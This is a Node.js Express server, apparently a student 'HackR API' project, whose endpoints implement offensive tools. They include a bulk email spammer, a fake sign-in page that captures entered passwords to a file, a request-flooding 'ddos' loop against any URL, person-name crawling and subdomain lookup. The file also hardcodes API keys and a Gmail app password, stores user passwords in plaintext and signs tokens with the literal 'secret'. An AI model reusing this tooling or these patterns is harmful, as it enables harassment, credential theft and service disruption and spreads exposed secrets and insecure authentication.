const express = require('express')
const axios = require('axios');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const { faker } = require('@faker-js/faker');
const app = express()
const port = 3000
const { User, Role } = require('./models');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const authorize = require('./authorize');

app.use(express.urlencoded({extended : true}))
app.use(express.json())
app.use(cors())


app.get('/', (req, res) => {
    res.send('HackR API - Maël GUILLOTEAU');
});

// Functionnalities

app.get('/tools/email-check', authentication, authorize('email-check'), async (req, res) => {
    const { email } = req.query; 
    if (!email) {
        return res.status(400).send('email requis');
    }

    try {
        const response = await axios.get(`https://api.hunter.io/v2/email-verifier?email=${email}&api_key=4c03cad5c7458f943080c7d3f04c999716023dfa`);
        const result = response.data.data;
        if (result.status === 'valid'){
            res.send('email exists')
        } else {
            res.send('email doesn\'t exist')
        }
    } catch (error) {
        res.status(500).send('error while checking email');
    }
});

app.post('/tools/spammer', authentication, authorize('spammer'), async (req, res) => {
    const { email, subject, text, count } = req.body;
    
    if (!email || !subject || !text || !count) {
        return res.status(400).send('All fields are required (email, subject, text, count)');
    }

    try {
        await sendSpamEmail(email, subject, text, parseInt(count));
        res.status(200).send(`${count} emails successfully sent to ${email}`);
    } catch (error) {
        console.error('Error when sending emails:', error);
        res.status(500).send('Error when sending emails.');
    }
});

app.get('/tools/phishing', authentication, authorize('phishing'), (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Page</title>
    </head>
    <body>
        <h2>Sign in</h2>
        <form id="form">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            <br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <br>
            <button type="submit">Login</button>
        </form>
        <script>
            document.querySelector('#form').addEventListener('submit', function(e) {
                e.preventDefault();
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                
                fetch('/tools/phishing/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, password })
                }).then(response => {
                    if (response.ok) {
                        alert('Captured Email and Password');
                    }
                }).catch(error => console.error('Error:', error));
            });
        </script>
    </body>
    </html>`;
    
    res.send(html);
});

app.post('/tools/phishing/capture', authentication, authorize('phishing'), (req, res) => {
    const { email, password } = req.body;
    const data = `Email: ${email}, Password: ${password}\n`;

    fs.appendFile(path.join(__dirname, 'captures.txt'), data, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            return res.sendStatus(500);
        }
        res.sendStatus(200);
    });
});

app.get('/tools/password-check', authentication, authorize('password-check'), async (req, res) => {
    const { password } = req.query;
    if (!password) {
        return res.status(400).send('mot de passe requis');
    }

    try {
        const response = await axios.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt');
        const commonPasswords = response.data.split('\n');
        const isCommon = commonPasswords.includes(password);

        if (isCommon) {
            res.send('the password is current.');
        } else {
            res.send('the password is not current.');
        }
    } catch (error) {
        console.error('error retrieving password list :', error.message);
        res.status(500).send('password verification error.');
    }
});

app.get('/tools/domain-info', authentication, authorize('domain-info'), async (req, res) => {
    const { domain } = req.query;
    if (!domain) {
        return res.status(400).send('domain name required.');
    }

    try {
        const response = await axios.get(`https://api.securitytrails.com/v1/domain/${domain}/subdomains`, {
            headers: {
                'APIKEY': 'zXX3d0vUSreC-9KY2-SwAQULQCmkhDnv' 
            }
        });

        res.json(response.data);
    } catch (error) {
        console.error('error when retrieving sub-domains.', error.message);
        res.status(500).send('error when retrieving sub-domains.');
    }
});

app.post('/tools/ddos', authentication, authorize('ddos'), async (req, res) => {
    const { targetUrl, numberOfRequests } = req.body;

    if (!targetUrl || !numberOfRequests) {
        return res.status(400).send('Target URL and number of requests required.');
    }

    const results = [];

    for (let i = 0; i < numberOfRequests; i++) {
        try {
            await axios.get(targetUrl);
            results.push(`Request ${i + 1} sent to ${targetUrl}`);
        } catch (error) {
            results.push(`Error with request ${i + 1}: ${error.message}`);
        }
    }

    res.json({ message: 'Simulation complete.', results });
});

app.get('/tools/random-image', authentication, authorize('random_image'), async (req, res) => {
    try {
      const imageResponse = await axios.get('https://thispersondoesnotexist.com', {
        responseType: 'arraybuffer'
      });
  
      res.set('Content-Type', 'image/jpeg');
      res.send(imageResponse.data);
    } catch (error) {
      res.status(500).send('Error generating image');
    }
});

app.get('/tools/generate-identity', authentication, authorize('generate-identity'), (req, res) => {
    const identity = {
        firstName: faker.person.firstName(),
        lastName: faker.person.lastName(),
        email: faker.internet.email(),
        address: faker.location.streetAddress(),
        city: faker.location.city(),
        country: faker.location.country(),
        phone: faker.phone.number(),
    };
    
    res.json(identity);
});

app.get('/tools/crawler', authentication, authorize('crawler'), async (req, res) => {
    const { name } = req.query;

    if (!name) {
        return res.status(400).send('Nom requis.');
    }

    try {
        const response = await axios.get(`https://api.social-searcher.com/v2/search`, {
            params: {
                q: name,
                api_key: 'f56047486e056256a67cafe1bcb6dc25',
            },
        });

        res.json(response.data);
    } catch (error) {
        console.error('Error while retrieving information :', error.message);
        res.status(500).send('Error retrieving information or maximum number of requests reached');
    }
});

app.get('/tools/generate-password', authentication, authorize('generate-password'), (req, res) => {
    const { length } = req.query;
    const passwordLength = length ? parseInt(length, 10) : 12;

    if (isNaN(passwordLength) || passwordLength < 8) {
        return res.status(400).send('Invalid password length. Minimum 8 characters.');
    }

    const generateComplexPassword = (length) => {
        const lowerChars = 'abcdefghijklmnopqrstuvwxyz';
        const upperChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const numbers = '0123456789';
        const specialChars = '!@#$%^&*()_+~`|}{[]:;?><,./-=';
        
        const allChars = lowerChars + upperChars + numbers + specialChars;
        let password = '';

        password += lowerChars[Math.floor(Math.random() * lowerChars.length)];
        password += upperChars[Math.floor(Math.random() * upperChars.length)];
        password += numbers[Math.floor(Math.random() * numbers.length)];
        password += specialChars[Math.floor(Math.random() * specialChars.length)];

        for (let i = password.length; i < length; i++) {
            password += allChars[Math.floor(Math.random() * allChars.length)];
        }

        return password.split('').sort(() => 0.5 - Math.random()).join('');
    };

    const securePassword = generateComplexPassword(passwordLength);
    res.send(`Password: ${securePassword}`);
});

// Test
app.get('/protected-route', authentication, (req, res) => {
    if (req.user.role !== 'admin') {
        return res.status(403).json({ message: "Access forbidden" });
    }
    res.status(200).json({ message: "You have access to this route", user: req.user });
});

// Register / Login / Logout

app.post('/register', async (req, res, next) => {
    try {
        let { email, password, roleId } = req.body;
        roleId = roleId || 2;

        let user = await User.create({
            email, 
            password: password,
            roleId
        });
        res.status(201).json({ id: user.id, email: user.email });
    } catch (error) {
        next(error);
    }
});

app.post('/login', async (req, res, next) => {
    try {
        let { email, password } = req.body;
        if (!email) throw { name: "Email is required" };
        if (!password) throw { name: "Password is required" };

        let user = await User.findOne({
            where: { email },
            include: [Role]
        });

        if (!user) throw { name: "Invalid email/password" };
        
        let valid = password === user.password;
        if (!valid) throw { name: "Invalid email/password" };

        let access_token = jwt.sign({ id: user.id, role: user.Role.name }, "secret");
        res.status(200).json({
            message: "you are logged in",
            access_token: access_token
        });
    } catch (error) {
        next(error);
    }
});

let blacklist = [];
app.post('/logout', authentication, (req, res) => {
    // Ajouter le token à la liste noire
    blacklist.push(req.headers.authorization.split(' ')[1]); // Récupère le token Bearer
    res.status(200).json({ message: "Successful disconnection." });
});

// Swagger

app.get('/swagger', (req, res) => {
    res.sendFile(path.join(__dirname, 'swagger.json'));
})



app.listen(port, () => {
    console.clear()
    console.log(`The app is running on port ${port}`)
})

app.use(errorHandler)

function errorHandler(err, req, res, next){
    let status = err.status || 500
    let message = err.message || "Internal server error"

    switch(err.name){
        case "SequelizeValidationError":
        case "SequelizeUniqueConstraintError":
            status = 400;
            message = err.errors[0].message
            break;
        case "Invalid Input":
        case "Email is required":
        case "Password is required":
            status = 400;
            message = err.name
            break;
        case "Invalid email/password":
            status = 401;
            message = err.name
            break
        case "Invalid token":
        case "JsonWebTokenError":
            status = 401;
            message = "Invalid token"
            break
        case "Forbidden" :
            status = 403;
            message = "You are not authorized"
            break;
        case "Data not found":
        case "Hero not found":
            status = 404;
            message = err.name
            break;
    }
    res.status(status).json({message})
}

async function authentication(req, res, next) {
    try {
        if (!req.headers.authorization) throw { name: "Invalid token" };
        let [type, token] = req.headers.authorization.split(" ");
        if (type !== "Bearer") throw { name: "Invalid token" };

        // Vérifier si le token est sur la liste noire
        if (blacklist.includes(token)) throw { name: "Invalid token" };
        
        let payload = jwt.verify(token, "secret");
        if (!payload) throw { name: "Invalid token" };

        let user = await User.findByPk(payload.id, { include: [Role] });
        if (!user) throw { name: "Invalid token" };

        req.user = {
            id: user.id,
            roleId: user.roleId,
            role: user.Role.name
        };
        next();
    } catch (error) {
        next(error);
    }
}

// Configuration du transporteur pour l'envoi d'emails
let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'hackrapi42@gmail.com',
      pass: 'xzft yepj ppog erqi',
    }
});

// Fonction pour envoyer un email
async function sendSpamEmail(email, subject, text, numOfEmails) {
    for (let i = 0; i < numOfEmails; i++) {
      let mailOptions = {
        from: 'hackrapi42@gmail.com',
        to: email, 
        subject: subject, 
        text: text, 
      };
  
      try {
        await transporter.sendMail(mailOptions);
        console.log(`Email ${i + 1} sent successfully`);
      } catch (error) {
        console.error(`Error sending email ${i + 1}:`, error);
      }
    }
  }


module.exports = app